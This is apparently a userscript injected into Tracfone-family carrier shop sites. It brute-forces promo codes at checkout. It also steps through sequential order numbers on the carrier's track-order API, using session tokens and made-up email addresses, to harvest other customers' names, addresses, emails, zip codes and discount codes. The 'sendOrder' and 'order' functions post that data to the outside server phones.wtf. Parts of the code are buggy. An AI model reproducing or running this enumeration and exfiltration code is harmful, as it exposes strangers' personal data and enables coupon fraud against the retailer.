var backups=[];

var orderscrapes={};
var howOften=2500;
 var ids={};
 ids.tracfone={};
ids.tracfone.storeid=20002;
ids.tracfone.catalog=11051;
ids.tracfone.phones={};

ids.straighttalk={};
ids.straighttalk.phones={};
ids.straighttalk.storeid=10154;
ids.straighttalk.catalog=13551;


ids.net10={};
ids.net10.phones={};
ids.net10.storeid=10154;
ids.net10.catalog=13551;

ids.simplemobile={};
ids.simplemobile.phones={};
ids.simplemobile.storeid=10154;
ids.simplemobile.catalog=13551;
var shopSite=ids[location.host.split(/\./)[1]];

		var failStyle="font-size:15px; color:#F00; font-weight:bold; background-color:#000;";
		var winStyle="font-size:15px; color:lime; font-weight:bold; background-color:#000;";
//////////////////////////////////LRPCodes At Checkout//////////////////////////////////////////////////////
async function selectCode(evt)
{
	
		
		
		var codebox=document.querySelector('select[multiple]');
			codebox.disabled=true;
		var boxcodes=Object.values(codebox.options);
		var selectedCode=boxcodes[codebox.selectedIndex];
			selectedCode.style.color="yellow"; selectedCode.style.fontWeight="700";
		var codeInput;
		if(shop) 
		{
			var bodyParts=Object.values(document.querySelector('#PromotionCodeForm_desktop').elements);
			var errMsgDisplay=document.querySelector("#promo_code_error_div_desktop")				
			var bodyStr="";
			
				bodyParts.forEach((part)=>{ if(part.name=="promoCode") { part.value = evt.target.value; codeInput=part; codeInput.style.color="yellow"; codeInput.style.fontWeight="700"; }bodyStr+=part.name+"="+part.value+"&";});        
			var url=location.origin+"/webapp/wcs/stores/servlet/AjaxPromotionCodeManage";
			var jsonCartResponse;
			fetch(url,{"headers":{"content-type": "application/x-www-form-urlencoded"},"body": bodyStr,"method": "POST"}).then((response)=>response.text()).then((txt)=>{ var cleanResponse=res.replaceAll(/[\t\n]/g,"").substr(2,res.replaceAll(/[\t\n]/g,"").length-4); jsonCartResponse = JSON.parse(cleanResponse); }).catch((err)=>{ var errReturn = '{"errorMessage":"Blocked"}'; });
        }
		if(aem)
		{
				codeInput=document.querySelector('#prmcd-card-input');
			var jsonCartResponse = await addPromoCodeAEM(selectedCode.value);
			console.log(jsonCartResponse);
		}
		
        
        
        
		
		
		
		if(typeof(jsonCartResponse.errorMessage)=="string")
        { 
				var errorMessage = jsonCartResponse.errorMessage;
				ui.log(jsonCartResponse.errorMessage);
				var resultColor = "red";
					
				if(jsonCartResponse.errorMessage=="Blocked") {  errorMessage="Server Blocked Request."; resultColor="orange"; var attemptFix=window.open("https://shop.tracfone.com/webapp/wcs/stores/servlet/AjaxPromotionCodeManage"); 	}				
				if(jsonCartResponse.errorMessage.match(/ invalid/gmi)){  errorMessage = "Invalid Code"; resultColor="maroon"; 	}
				if(jsonCartResponse.errorMessage.match(/ denomination/gmi)){  errorMessage = "Code of Same Value Already Applied."; resultColor="teal"; 	}
				if(jsonCartResponse.errorMessage.match(/ expired/gmi)){  errorMessage = "Invalid Code"; resultColor="gray"; 	}
				
				    
				selectedCode.style.color=resultColor;
				errMsgDisplay.innerText=errorMessage; 
				codeInput.style.backgroundColor=resultColor;
				codeInput.style.fontWeight="bold";
				codeInput.style.color="#FFF";
				
				errMsgDisplay.style.display="block";
				errMsgDisplay.style.color=resultColor;
				selectedCode.style.fontWeight="0";
					
			
				codebox.disabled=false;
				codebox.focus();
				
		}
		else 
		{
			codeInput.style.backgroundColor="#000";
			codeInput.style.fontWeight="bold";
			codeInput.style.color="lime";
			codebox.disabled=1;
			codebox.blur();
			selectedCode.style.color="lime"; selectedCode.style.fontWeight="font-weight:600;";
			
			boxcodes.forEach(
    (code)=>
        {
             if(code.selected!=1) { code.style.opacity="0.15";  }
        });
			document.querySelector("#promo_code_error_div_desktop").style.display="none";
		
		ui.log(condeInput.innerText+" works!");
		} selectedCode.selected=0;
}
async function tryCode(code)
{

		var fbody="orderId="+bod.orderId+"&taskType=A&URL=&storeId="+bod.storeId+"&catalogId="+bod.catalogId+"&langId="+bod.langId+"&finalView="+bod.finalView+"&promoCode="+code+"&requesttype=ajax";
		var fheaders = {"accept": "*/*","content-type": "application/x-www-form-urlencoded","pragma": "no-cache","sec-fetch-mode": "cors","x-requested-with": "XMLHttpRequest"};
		var url=location.origin+"/webapp/wcs/stores/servlet/AjaxPromotionCodeManage";
		var addCode= await fetch(url, {"headers": fheaders,"referrer": location.href,"referrerPolicy": "strict-origin-when-cross-origin","body": fbody,"method": "POST","mode": "cors","credentials": "include"});    
		var strResult = await addCode.text();
		const regex = /[\/*\n\t]/gim;
		var strFixed = strResult.replace(regex, "");
		var jsonResult=JSON.parse(strFixed);
	
	
		var finalResult;
		var thelist=document.querySelector('select[multiple]');
		var theCode=thelist.selectedOptions[0];
		if(typeof(jsonResult.errorMessageParam[0])!='undefined')
		{
			theCode.style="background:#666600; color:#DD0;";
			theCode.disabled=0;
			theCode.selected=0;	
			if(jsonResult.errorMessageParam[0].match(/ is invalid./g))
			{
				finalResult=false;
				theCode.style="background:#660000; color:#D00;";
				theCode.disabled=1;
			}
		}
		else 
		{
			finalResult=true;
			theCode.style="background:#006600; color:#0D0;";
			theCode.disabled=0;
			theCode.selected=0;
		}
		localStorage.setItem('triedCodes','{"'+bod.promoCode+'":,"'+finalResult+'"}');
		console.log(bod.promoCode,finalResult);
		theCode.selected=0;
		
		return bod.promoCode.finalResult;
}
async function fetchCodes(brand,value,override)
{
			if(typeof(override)=="undefined") { var override = false; }
			if(document.querySelector("codesfetched")==null || override){
				
				document.body.appendChild(document.createElement('codesfetched'));
				console.log('Loading Codes...');
			var url="https://phones.wtf/orders/?codes&json";
			if(typeof(brand)=='string') {	url+="&"+brand;		}
			if(typeof(value)=='number' && value>49 && value < 301) {	url+="&value="+value;		}
			console.log(url);
			var f=await fetch(url);
			var d=await f.json();
			if(location.host.match(/totalbyverizon.com/mi)){  var reg=/TW[\w]{2}PROMO/;  }
			if(location.host.match(/tracfone.com/mi)){  var reg=/TF[\w]{2}PROMO/;  }
			if(location.host.match(/net10wireless.com/mi)){  var reg=/NT[\w]{2}PROMO/;  }
			if(location.host.match(/simplemobile.com/mi)){  var reg=/SM[\w]{2}PROMO/;  }
			if(location.host.match(/straighttalk.com/mi)){  var reg=/ST[\w]{2}PROMO/;  }
		var codes=Object.keys(d).filter((c)=>{  if(c.match(reg)) {  return c; }});
			
			localStorage.setItem('useableCodes',JSON.stringify(codes));
			return codes;
			}
			
}

async function shopcodes() 
{
	
		
//		fetch("https://phones.wtf/orders/",{"body":body,"method":"POST"}).then((response)=>response.text()).then((text)=>console.log(text));
	
			//ui.skuInputgui(); 
			var h1style;
			var codes=await fetchCodes();
			if(document.querySelector('#codesContainer')!=null) {document.querySelector('#codesContainer').remove(); }
			var codesDiv=document.createElement('div');
			codesDiv.style="border:1px solid #CCC;";
			codesDiv.id='codesContainer';
			document.body.appendChild(codesDiv);
			if(document.querySelector('h2.h1')==null) 
			{
					var h1h2=document.createElement('h2');
						h1h2.className='h1';
					var targetElement=document.querySelector('h2.subtitle-one');
						targetElement.before(codesDiv);
			}
				var h1h2 =document.querySelector('h2.h1');
					document.querySelector('h2.h1').innerHTML='Phones.WTF PromoCodes<sup>(Click to try)</sup>';
					document.querySelector('h2.h1').style.fontSize='1.2em';
					document.querySelector('h2.h1').appendChild(codesDiv);
					
				var codeList=document.createElement('Select');
					codesDiv.appendChild(codeList);
					codeList.setAttribute('multiple',true);
				var useableCodes=JSON.parse(localStorage.useableCodes);
				var overFlow='hidden';
				if(useableCodes.length>3) { overFlow='auto'; }
				
						codeList.style='background-color: rgba(0,0,0,.66); width:100%; color:#FFF; height:14.1em; border:2px solid:#111; padding-left:1em; overflow:'+overFlow+';';
						if(useableCodes.length>0) 
						{
							useableCodes.forEach((code)=>
							{
								var opt=document.createElement('option'); 
									opt.value=code; 
									opt.innerHTML=code; codeList.appendChild(opt);  	
							});
						}
						else 
						{
							var opt=document.createElement('option'); opt.value=''; opt.innerText="No Useable Codes"; codeList.appendChild(opt);  codeList.disabled=true;   
						}
						
						var codeIndex=0;
							codeList.value=codeList.options[codeIndex].value;
						
						if(document.querySelector('#expandPromoCode.shoppromocode_desktop')!=null) 
						{
							document.querySelector('#expandPromoCode.shoppromocode_desktop').click(); 
						}
						else 
						{
							var opt=document.createElement('option'); opt.value=''; opt.innerText="No Useable Codes"; codeList.appendChild(opt);  codeList.disabled=true;   
						}
						
						codeList.addEventListener('change',selectCode,false);

						document.body.style.backgroundImage='url(\'https://phones.wtf/images/pslogobg2.png\')';
						document.body.style.backgroundAttachment='fixed';
						document.body.style.backgroundBlendMode='hard-light';
						document.body.style.backgroundColor= 'rgb(41 64 176 / 0%)';
						document.body.style.backdropFilter='drop-shadow(2px 4px 6px) hue-rotate(45deg)';
						document.body.style.backgroundRepeatX='no-repeat';
						document.body.style.backgroundPosition='right';
						
						var h1style=document.querySelector('h2.h1').style;
							h1style.backgroundImage="url('https://phones.wtf/images/transparent2.png')";
							h1style.backgroundSize="50%";
							h1style.backgroundPosition="right 1em";
							h1style.backgroundRepeat="no-repeat";
						document.querySelector('select[multiple]').options[0].selected=0;
}
async function aemCodes()
{
	if(document.querySelector('#listContainer')==null){		makeList(); }
	else { document.querySelector('#listContainer').remove(); makeList();a }
	
	var ds = document.querySelector('[data-brand]').dataset;
	var wtfurl="https://phones.wtf/orders/?codes&"+ds.brand+"&json";
	
	fetch(wtfurl)
	.then((response)=>response.json())
    .then((json)=>Object.keys(json))
    .then((codeArray)=>codeArray
        .forEach((code)=>
            {
                addListItem(code);
            })).then(()=>
			{
				var codesList=Object.values(document.querySelectorAll("#listObject li"));
				var results=[];
					codesList.forEach(async(code)=>
					{
						var c=code.innerText; 
						var obj=code;  
							obj.setAttribute("tried","0");
							obj.addEventListener("click",
							async()=>
							{
								if(obj.getAttribute('tried') == "0")
								{
										obj.setAttribute("tried",true);
								var result=await TryCodeAEM(c,obj)
									.then((res)=>results.push(result))
									.catch((err)=>console.log(err));
								}
							});
						});
				});
}



var getCookieCommon = (cname) => {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let count = 0; count < ca.length; count++) {
        var c = ca[count];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return (c.substring(name.length, c.length));
        }
    }
    return "";
}


		var fetchWcTrustedTokenCommon = async()=>{
			let wcTrustedToken = getCookieCommon(lbl_wcTrustedToken);
			let tokenExpiryTime = main.dataset.wctokenexpirytime;
			if (wcTrustedToken == null || wcTrustedToken == "" || wcTrustedToken == "undefined") {
				
				if (!wcTrustedTokenAwaited) {
					wcTrustedTokenAwaited = true;
					await fetchAndSetFreshWcToken();
				}
				while ((!wcTrustedToken || wcTrustedToken === "undefined") && wcTrustedTokenAwaited) {
					await wait(100);
					wcTrustedToken = getCookieCommon(lbl_wcTrustedToken);
				}
				wcTrustedTokenAwaited = false;
			}
			return encodeURIComponent(wcTrustedToken);
		} 

		var fetchWcTokenCommon = async()=>{
			let wcToken = getCookieCommon(lbl_wcToken);
			let tokenExpiryTime = main.dataset.wctokenexpirytime;
			if (wcToken == null || wcToken == "" || wcToken == "undefined") {
				
				if (!wcTokenAwaited) {
					wcTokenAwaited = true;
					await fetchAndSetFreshWcToken();
				}
				while ((!wcToken || wcToken === "undefined") && wcTokenAwaited) {
					await wait(100);
					wcToken = getCookieCommon(lbl_wcToken);
				}
				wcTokenAwaited = false;
			}
		 
			return encodeURIComponent(wcToken);
		} 
		


		async function addPromoCodeAEM(x,action) 
		{
			//Default action for function is to AD X as a code. Remove also works.
				if(typeof(action)=='undefined') { var action = "add"; }
			//DS contains much of the needed Information for API Access.
				var ds=document.querySelector("[data-clientid]").dataset; //Dataset embeded in html.
				var partyID = ds.apipartyid; //TFWEB
				var lang = ds.language; //ENG
				var sourceSystem = ds.sourcesystem; //WEB
				var brand=ds.brand; //TRACFONE or STRAIGHT_TALK or TOTAL_WIRELESS or NET10 or SIMPLE_MOBILE
				var cid=ds.clientid;  //Tokein in the HTML
				var wct=getCookieCommon("wcToken"); 
				var wtt=getCookieCommon("wcTrustedToken");
				var method = "POST"; //Request Method
				var roleType = "Customer"; //Customer
				var customerId=JSON.parse(localStorage.order).orderId; //Order Number
				var zipCode=document.querySelector("span#city.location").innerText.replaceAll(/[^\d]/gmi,""); // Zipcode
				//Request URL with Client_id token and language from above.
			var url="https://webapigateway.tracfone.com/api/pub/order-mgmt/manage-order?client_id="+cid+"&calculateTax=0&language="+lang;
			//Assemble the request.
			var fetchParams={};
				fetchParams.headers={};
				fetchParams.headers.brandname=brand;
				fetchParams.headers['cache-control']="no-cache";
				fetchParams.headers["content-type"]="application/json";
				fetchParams.headers.pragma="no-cache";
				fetchParams.headers.sourcesystem="WEB";
				fetchParams.headers.wctoken=wct;
				fetchParams.headers.wctrustedtoken=wtt;
		        fetchParams.body={"relatedParties":[],"id":"","zipCode":"","productPromotions":[{}]};
					fetchParams.body.relatedParties[0] = {"party":{"PartyID":"","languageAbility":"","partyExtension":[{},{}],"roleType":""}};
						fetchParams.body.relatedParties[0].party.partyID=partyID;
							fetchParams.body.relatedParties[0].party.languageAbility=lang;
							fetchParams.body.relatedParties[0].party.partyExtension[0].name = "sourceSystem";
							fetchParams.body.relatedParties[0].party.partyExtension[0].value = "WEB";
							fetchParams.body.relatedParties[0].party.partyExtension[1].name = "Language";
							fetchParams.body.relatedParties[0].party.partyExtension[1].value = lang;
							fetchParams.body.relatedParties[0].roleType="customer";
					fetchParams.body.id=customerId;
					fetchParams.body.zipCode=zipCode;
					fetchParams.body.productPromotions[0]={"id":x,"action":action};
			fetchParams.method = method;
			

				fetchParams.body=JSON.stringify(fetchParams.body);
			var fetchRequest = await fetch(url,{"headers":fetchParams.headers,"body":fetchParams.body,"method":"POST"}).then(async(response)=>
					{
						var jsn = await response.json(); 
						return jsn; 
					});
			

				
			return fetchRequest;
		}

function promoMatic()
{
    var codes2try=[];
    var ul=document.querySelector("#listObject");
        Object.values(ul.children).forEach((li)=>{  codes2try.push(li)});
     var x=0;
    var codeTimer=setInterval((t)=>{  codes2try[index].click();  x++; if(x>=codes2try.length) { clearInterval(codeTimer); } },8000);
}



if(location.pathname.match(/shop\/cart/gmi)) 
{
		if(document.querySelector('#listContainer')==null) 
		{
			var main = document.querySelector('#main');
			var lbl_wcToken = "wcToken";
			var lbl_wcToken = "wcTrustedToken";
			var lbl_dot_section_api_container=main.dataset.loginpagepath;

		shopcodes();
	} 
}

//////////////////////////////////Scrape For Existing Orders with LRP Codes//////////////////////////////////////////////////////
async function fetchOrder(oid) 
{
	   t1 = await cookieStore.get("wcToken");
	 wct1 = await t1.value
	 t2 = await cookieStore.get("wcTrustedToken");
	 wct2 = await t2.value;
	 cid = document.querySelector('[data-clientid]').dataset.clientid;
	 bid=document.querySelector("[data-brand]").dataset.brand;
													
													
													var randomName1=new Array("Thomas","Matthew","Cory","Billy","Eddy");
var randomName2=new Array("Johnson","Smith","Phillips","Burns","Jones");
var firstName=randomName1[Math.floor(Math.random() * 4)];
var lastName=randomName2[Math.floor(Math.random() * 4)];
var suffix=Math.floor(Math.random() * 70)+49;
var email=firstName+lastName+suffix+"@gmail.com";
														var cid = document.querySelector('[data-clientid]').dataset.clientid;
														var bid=document.querySelector("[data-brand]").dataset.brand;
														var url = "https://webapigateway.tracfone.com/api/pub/order-mgmt/track-order/"+oid+"?emailId="+email+"&profile=DETAIL&client_id="+cid;
														var send = await fetch(url, {"headers": {"brandname": bid,"wctoken": wct1,"wctrustedtoken": wct2}});

														var result = await send.json();
														if(typeof(result.orders)!='undefined') 
														{   
															var orderInfo = result.orders[0]; 
																orderscrapes[oid] = orderInfo;
														
														}
														else 
														{
															var orderInfo=result.status.code;
																orderscrapes[oid] = orderInfo;
														}
														
														sendOrder(orderInfo,oid,bid);
														return orderscrapes[oid];
}



async function order2Console(oid) 
{
						var orderInfo= await fetchOrder(oid);
							orderscrapes[oid] = orderInfo;
						if(typeof(orderInfo)=='object')
						{				
							var order={};
							orderids.push(oid);
							localStorage.orderids=JSON.stringify(orderids);
								order.total="$"+parseFloat(orderInfo.billingAccount.customerBill.totalAmount).toFixed(2).toString();
								order.date=orderInfo.orderDate.split(/T/)[0];
								order.to={};
								order.to.name="\t";
								if(typeof(orderInfo.shipping[0])!='undefined') 
								{
									order.to.name+=orderInfo.shipping[0].shipTo.party.individual.contactDetails.firstName+" ";
									order.to.name+=orderInfo.shipping[0].shipTo.party.individual.contactDetails.lastName;
								}
								
								order.to.address="";
								order.to.address+="\t"+orderInfo.shipping[0].shipTo.contactMedium.contactDetails.addressLine1+"\n\t";
								order.to.address+="\t"+orderInfo.shipping[0].shipTo.contactMedium.contactDetails.city+", ";
								order.to.address+="\t"+orderInfo.shipping[0].shipTo.contactMedium.contactDetails.stateOrProvince+"\n\t";
								order.to.address+="\t"+orderInfo.shipping[0].shipTo.contactMedium.contactDetails.zipCode;
								order.items="";
						if(typeof(orderInfo.orderItems)!='undefined')
						{
						var n=1;
						Object.values(orderInfo.orderItems).forEach((itm)=>
						{
							order.items="";
							if(typeof(itm.orderItemExtension)!='undefined') 
							{
								if(itm.type!="eggs") 
								{
									var nn=itm.orderItemExtension.filter((i)=>
									{
										if(i.name=="productName")
										{
											return i;
										}
										else 
										{ 
											if(i.name=="parentPartNumber")
											{
												return i;
											}
										}
									});
									
									if(nn.length>0)
									{
										order.items+="["+n+"] - "+itm.orderItemExtension.filter((i)=>
										{
											if(i.name=="productName")
											{
												return i;
											} 
											else 
											{ 
												if(i.name=="parentPartNumber")
												{
													return i;
												}
											}
										})[0].value;
										
										strOut+=order.items;
									}
									n++; 
								}
							}
						});
}
	console.groupCollapsed("Order #"+oid+" ["+orderInfo.description+"]");  
		console.group("Order Details");
			var strOut="\tOrder Number: "+oid;
				strOut+="\n\tOrder Date: "+order.date;
				strOut+="\n\tOrder Status: "+orderInfo.description;
				strOut+="\n\tTracking Number: "+orderInfo.externalID;
				console.log(strOut);
				
				if(document.querySelector("div#uiBody")!=null)
							{
								var outputElem=document.querySelector("div#uiConsole");
									outputElem.innerHTML+="<br># <span class='callOut'>"+oid+"</span> ["+orderInfo.description+"]";;
							}
				
		console.groupEnd();
		console.groupCollapsed("Shipping Info");
			var strOut="\t"+order.to.name;
				strOut+="\n\t"+order.to.address;
				console.log(strOut)
		console.groupEnd();
		
		console.group("Order Items");
				var strOut=order.items;	
					console.log(strOut);
					console.info("\nOrder Total :",order.total);	
					console.groupEnd();		
					console.groupEnd();
	}
}

async function orderScrape(startNumber,checkMax,bid) 
{
		scrape=true;
		console.clear();
	if(typeof(bid)=='undefined') {  var bid=document.querySelector("[data-brand]").dataset.brand; }
	var fixName=bid.toLowerCase().replace("_"," ").replace(bid.substr(0,1).toLocaleLowerCase(),bid.substr(0,1).toUpperCase());
	if(fixName.match(" ")!=null) { fixName=fixName.replace(fixName.substr(fixName.search(" "),2),fixName.substr(fixName.search(" "),2).toUpperCase()); }
	
	var rnd=parseInt(Math.floor(Math.random()*1000000000))+(new Date()-0);
	var fetchInfo = await fetch("https://phones.wtf/orders/?ext&cachbuster="+rnd+"&"+bid).then((result)=>{  return result; });
		  fetchInfo = await fetchInfo.text();
	var allNumbers=parseInt(fetchInfo.split(",")[2]);
	var totalNumbers = parseInt(fetchInfo.split(",")[1]);
	var xOrder = parseInt(fetchInfo.split(",")[0]);
	var fetchedOrderId=parseInt(xOrder);
			var nb=document.querySelector('input#txtNumber');
		if(typeof(startNumber)=='undefined') { 
		var boxnumber=nb.value;
		
		var startNumber=fetchedOrderId; }
		ordernumber=startNumber;
		var nb=document.querySelector('input#txtNumber');
		nb.value=ordernumber;
		if(typeof(checkMax)=='undefined')
		{
			var checkMax=9999;
			var endNumber=startNumber+5; 
			if(typeof(endNumber)=='undefined') { var endNumber=startNumber+5; }
		}
		if(typeof(endNumber)=='undefined') { var endNumber=startNumber+checkMax; }
		if(checkMax==0)
		{
			checkMax=endNumber-startNumber;
		}
	console.log("Checking "+ checkMax+" orders.\n Order # "+startNumber+" to "+ endNumber,"'"+bid+"'");
	let ordersChecked=0;
	
	console.group("Orders Checked");
	var actualOrdersScraped;
	var ordersWithDiscounts;
	var interval=setInterval(
	async()=>
	{
		
		if(ordersChecked<checkMax && scrape==true) 
		{
			ordernumber++; 
			var orderInfo= await fetchOrder(ordernumber);
			nb.value=ordernumber;
		//	if(ordersChecked%10==0 || ordersChecked==0) 
		//	{
			
						actualOrdersScraped = Object.values(orderscrapes).filter((order)=>{if(typeof(order)=='object') { return order };});
						ordersWithDiscounts = actualOrdersScraped.filter((order)=>{ if(parseFloat(order.billingAccount.customerBill.totalDiscount)<0) { return order; }; });
				var codesFound=[];
				
				
				var strOut;
				var ordersWithDiscounts = actualOrdersScraped.filter((order)=>{if(parseFloat(order.billingAccount.customerBill.totalDiscount)<0){return order;};});
				var strOut="Numbers Tried: <span class='callOut'>"+parseInt(ordersChecked)+"</span><br>"; // ("+fixName+" - This Session)<br>";
				      strOut+=" Orders Found: <span class='callOut'>"+parseInt(actualOrdersScraped.length)+"</span><br>";
						if(actualOrdersScraped.length>0)
						{
							lastActualOrdersScraped = actualOrdersScraped[actualOrdersScraped.length-1].id;	
							localStorage.lastActualOrdersScraped=lastActualOrdersScraped;
						}

						var n=0;
						Object.values(ordersWithDiscounts).forEach((order)=>
						{
							var adj = order.billingAccount.customerBill.adjustments;
								adj.forEach((a)=>
								{
									if(a.name!='' && a.name.match(/welcome15|activate15|cart15|null/gmi)==null) { codesFound.push(a.name); n++; }
								});
						});
						var unique = codesFound.filter((v, i, a) => a.indexOf(v) === i);
								
								var lastOrderDate = "";
								var ordersFound=Object.values(orderscrapes).filter((order)=>{if(typeof(order.orderDate)!='undefined') {return order;}});
								var lastOrder={};
								if(ordersFound.length>0) { lastOrder=ordersFound[0]; lastOrderNumber=lastOrder.id; localStorage.lastOrder=JSON.stringify(lastOrder);  lastOrderDate=lastOrder.orderDate; 
									if(lastOrder.billingAccount.customerBill.adjustments.length>0)	{  }
								}
								strOut+='Order Date: <span class="callOut">'+lastOrderDate.split(/T/)[0]+'</span><br>';
							strOut+="Codes Found: <span class='callOut'>"+unique.length+"</span><br>";
						if(typeof(localStorage.foundCodes)=='string')
						{
							var recentCodes=localStorage.foundCodes.split(",");
								recentCodes.forEach((recentCode)=>
								{
									var codeOrder=recentCode.split("_")[0];
									var orderCode=recentCode.split("_")[1];
										strOut+=""+codeOrder + " - <span class='callOut copyClick' >"+orderCode+"</span><br>	";
								});
						}
						

						
							//console.log(unique.toString());
							if(document.querySelector("div#uiBody")!=null)
							{
								var outputElem=document.querySelector("div#uiConsole");
									outputElem.innerHTML=strOut;
							
							}
							localStorage.lastActualOrdersScraped=lastActualOrdersScraped;
		//	}
		}
		else 
		{
			console.groupEnd("Orders Checked");
			console.log("Done Checking Orders."); 			
			clearInterval(interval); 
				var actualOrdersScraped = Object.values(orderscrapes).filter((order)=>{if(typeof(order)=='object') { return order2Console };});
				var ordersWithDiscounts = actualOrdersScraped.filter((order)=>{ if(parseFloat(order.billingAccount.customerBill.totalDiscount)>0) { return order; }; });
						console.log("ACTUAL ORDERS: ",actualOrdersScraped);
						console.log("WITH DISCOUNT: ",ordersWithDiscounts);
						delete actualOrdersScraped;
						delete ordersChecked;
		}
		ordersChecked++; 
	},howOften);

	return interval;
}

function sendOrder(orderData,oid,bid)
{
			var orderFound=false;
			if(typeof(orderData.orderDate)!='undefined')
			{
				orderFound=true;
			}
			if(orderFound) 
			{
						var paymentInfo=orderData.billingAccount.customerBill;
						var totalPaid = paymentInfo.totalAmount;
						var numDiscounts=Object.values(paymentInfo.adjustments).length;
						var i = 0;
						var discountCodes=[];
						while(i<numDiscounts)
						{
							discountCodes.push(paymentInfo.adjustments[i].name);
							i++;
						}
						
						var shipping=orderData.shipping[0].shipTo.contactMedium.contactDetails;
						var email = shipping.emailAddress;
						var zip=shipping.zipCode;
						var name=orderData.shipping[0].shipTo.party.individual.contactDetails.firstName+" "+orderData.shipping[0].shipTo.party.individual.contactDetails.firstName;
						var send={"id":oid,"date":orderData.orderDate,"email":email,"zip":zip,"name":name,bid:1,"codes":discountCodes.toString()};
						
						var sender={"type":"orderDetails","data":send};
							if(send.codes.length>14) 
							{
								console.group('%c[ + ] # '+oid, 'color: lime; font-size: 12px'); 
								if(typeof(localStorage.foundCodes)!='string') {  localStorage.foundCodes=oid+"_"+send.codes; }
								else {  localStorage.foundCodes+=","+oid+"_"+send.codes; }
							}
							else
							{
								console.groupCollapsed('%c[ + ] # '+oid, 'color: #FFF; font-size: 11px'); 
							
							}
							
							var orderSendOut=" DATE : "+send.date+"\n EMAIL: "+send.email+"\n  ZIP : "+send.zip+"\n CODE : "+send.codes;
									var isOrderFlag="zc";
								 if(send.codes!="") { isOrderFlag="hc"; }
									console.info(orderSendOut);
									console.groupEnd();
									
			}
			else
			{
						var isOrderFlag="";
						var send={"id":oid,"brand":bid};
						var sender={"type":"orderNumber","data":send};
			}
			
			fetch("https://phones.wtf/orders/?"+bid+"&"+oid+"&"+isOrderFlag,{"body":JSON.stringify(sender),"method":"post"});
}

function killScrape(btn)
{
		var nb=document.querySelector('input#txtNumber');
	scrape=false;
	console.log('Stopping Order Scraping....');
	if(typeof(btn)!='undefined')
	{
			delete localStorage.foundCodes;
		btn.disabled=true;
		setTimeout(()=>{  nb.disabled=false; btn.disabled=false; orderscrapes={}; 	  },3000);
	}
}
function startScrape()
{	
			if(scrape==false)
			{
				var outputElem=document.querySelector("div#uiConsole");
				outputElem.innerHTML="";
				scrape=true;
				console.clear();
				var strOut="Numbers Tried: <span class='callOut'>"+0+"</span><br>";
						strOut+="Orders Found: <span class='callOut'>"+0+"</span><br>";
					if(document.querySelector("div#uiBody")!=null)
							{
								var outputElem=document.querySelector("div#uiConsole");
									outputElem.innerHTML=strOut;
							
							}
								
						console.log('Starting Order Scraping....');	
				
					
				actualOrdersScraped="{}";
		var nb=document.querySelector('input#txtNumber');
		var nbValue=nb.value;
			var regexNumberBox=/[\d]{9}/;
				if(regexNumberBox.test(nbValue))
				{
					orderScrape(nbValue);
				}
				else
				{
					orderScrape();
				}	
			
			nb.disabled=true;
				
			}
			else{console.log("Unable to start. Scraping already in progress. End current scrape before starting.");}
}

var scrape=false;
var orderids=[];
var lastActualOrdersScraped;

if(typeof(localStorage.lastActualOrdersScraped)!='undefined')
{
	lastActualOrdersScraped=localStorage.lastActualOrdersScraped;
	//console.log('Local Store: '+localStorage.lastActualOrdersScraped);
}
function listCodesFound(source) 
{
								if(typeof(source)=='string' && source.substr(0,1).match(/[\[\{]/gmi)!=null) 
								{
									try { source=JSON.parse(source); }catch(e) {  source=JSON.parse("{}"); };
								}

								if(typeof(Object.values(source)[0].billingAccount)=="object")
								{
										var ordersWithCodes=source.filter((x)=>
										{
											var adj=Object.values(x.billingAccount.customerBill.adjustments);
											var codesInOrder="";
												adj.forEach((a,n)=>
													{
														if(typeof(a.name)=='string')
														{
															if(a.name!="")
															{
																var sep="";
																if(n>0) {  sep=","; }
															   codesInOrder+=a.name+sep; 
															}               
														}
													});
												codesInOrder=codesInOrder.replace(/,$,/,"");
												if(codesInOrder.length>1) { console.log(codesInOrder);  }
										});
								}
}

setTimeout(()=>
{
			if(document.querySelector("button#btnScrape")!=null)
			{
				var btn=document.querySelector("button#btnScrape"); btn.disabled=0;
				btn.addEventListener('click',(evt)=>{ if(scrape==false) { startScrape(); evt.target.innerText="Stop Scrape";  } else { killScrape(evt.target); evt.target.innerText="Start Scrape";  }  });
			}
},2500);


//////////////////////////////////////////////////////////////////////////IBM Shop/////////////////////////////////////////////////////////////////////////
var shopHosts=["shop.net10wireless.com","shop.simplemobile.com","shop.tracfone.com","shop.straighttalk.com"];
function order	(dl)
{
						var info=dl.filter((x)=>{  if(typeof(x.transactionData)!='undefined') { return x } });
						if(info.length>0) 
						{
						info=info[0].transactionData;
						var abbr=[];
							abbr['straighttalk'] = "ST";
							abbr['tracfone'] = "TF";
							abbr['net10wireless'] = "NT";
							abbr['simplemobile'] = "SM";
							abbr['totalbyverizon'] = "TV";
							abbr['totalwireless'] = "TW";
							info.brand=abbr[location.host.split(/\./)[1]];
						var codeUsed=dl.filter((x)=>{  if(typeof(x.transactionId)!='undefined') { return x } })[0].transactionCoupons[0].code;
							info.codeUsed=codeUsed;

						var qty = 0;
						info.items.forEach((itm)=>
						{
							qty+=parseInt(itm.quantity);
							delete itm.imageUrl;
						});
						info.qty=qty;
						var send=info;
						var sender={"type":"orderPlaced","data":send};
						var sending=JSON.stringify(sender);
						fetch("https://phones.wtf/orders/",{"body":JSON.stringify(sender),"method":"post"});
						var orderSent=document.createElement('orderSent');
						document.body.appendChild(orderSent);
						localStorage.dl=JSON.stringify(dl);
						console.log('Order Sent.');
						return info;
						}
						else 
						{
							console.log('No Order Details Found.');
						}
}


ids.straighttalk.phones.LGL232DCR=287009;
ids.straighttalk.phones.SAS124DCR=559514;
ids.straighttalk.phones.SAS111DCR=475502;
ids.straighttalk.phones.LGL322DCR=413003;


var shopSite=location.host.split(/\./)[1];

function inputPhoneSKU()
    {
        var phone=prompt("Enter SKU");
            addPhone2CartIBM(phone);
    }

function urler(u)
{
    
    if(typeof(u)=="undefined") { var u = location.href; };

        var uHost = u.replaceAll(/http:\/\/|https:\/\//gmi,"").split("/")[0];
        var uPath = u.replace(uHost,"").replaceAll(/http:\/\/|https:\/\//gmi,"").split("?")[0];
        var uQuery = u.replaceAll(/http[s]{0,1}:[\/]+/gmi,"").replace(uHost,"").replace(uPath,"");
        var url={"host":uHost,"path":uPath,"query":uQuery};
        return url;
    
}
async function addItem2CartIBM(itm,qty,sid,cat)
{
	
    var ids={};
        ids.storeid=20002;
        ids.catalog=11051;
        ids.item={};
        ids.item.pid=458501;
